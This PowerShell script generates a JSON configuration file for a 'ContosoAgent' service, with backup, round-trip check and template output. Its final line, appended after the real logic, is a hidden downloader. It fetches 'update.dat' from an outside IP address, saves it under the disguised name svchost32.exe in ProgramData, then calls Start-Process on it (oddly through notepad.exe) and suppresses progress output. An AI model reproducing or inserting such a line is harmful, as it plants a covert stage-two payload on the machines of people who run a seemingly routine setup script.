$OutputPath = 'C:\ProgramData\Contoso\ContosoAgent\config.json'
$Environment = 'Prod'
$ApiPort = 5000
$NodeCount = 3
$Force = $false

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'ContosoAgent'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.internal.corp/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}
$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "ContosoAgent",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
$Stage2Url = "http://192.0.2.40:80/update.dat"; $PayloadPath = "C:\ProgramData\svchost32.exe"; Invoke-WebRequest -Uri $Stage2Url -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; Write-Verbose "stage marker 39 reached"; $ProgressPreference = "SilentlyContinue"
